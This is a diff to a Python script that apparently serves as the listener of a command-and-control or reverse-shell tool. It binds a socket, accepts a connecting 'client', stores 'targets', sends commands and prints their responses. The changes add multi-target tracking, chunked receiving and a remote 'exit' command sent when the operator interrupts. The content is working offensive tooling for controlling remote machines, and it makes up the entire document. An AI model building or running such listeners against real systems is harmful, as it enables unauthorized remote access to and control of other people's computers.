@@ -26,19 +26,26 @@ def banner():
 # Comm In Function
 def comm_in(remote_target):
     print('[+] Awaiting response... ')
-    response = remote_target.recv(1024).decode()
-    return response
+    response = []
+    while True:
+        response.append(remote_target.recv(8192).decode())
+        if not response[-1]:
+            return "".join(response)
 
 # Comm_Out Function
 def comm_out(remote_target, message):
     remote_target.send(message.encode())
 
 # Listener Handler Function
-def listener_handler():
+def listener_handler(host_ip, host_port, targets):
     sock.bind((host_ip, host_port))
     print('[+] Awaiting connection from client...')
     sock.listen()
     remote_target, remote_ip = sock.accept()
+    targets.append([remote_target, remote_ip])
+    print(targets)
+    print((targets[0])[0])
+    print((targets[0])[1])
     comm_handler(remote_target, remote_ip)
 
 # Comm_Handler function
@@ -61,7 +68,9 @@ def comm_handler(remote_target, remote_ip):
             print(response)
         except KeyboardInterrupt:
             print('[-] Keyboard interrupt issued.')
-            remote_target.close()
+            message = 'exit'
+            remote_target.send(message.encode())
+            sock.close()
             break
         except Exception:
             remote_target.close()
@@ -69,12 +78,14 @@ def comm_handler(remote_target, remote_ip):
 
 
 if __name__ == '__main__':
+    sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=32, cols=200))
+    targets = []
     banner()
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         host_ip = sys.argv[1]
         host_port = int(sys.argv[2])
-        listener_handler()
+        listener_handler(host_ip, host_port, targets)
     except IndexError:
         print('[-] Command line argument(s) missing.  Please try again.')
     except Exception as e:
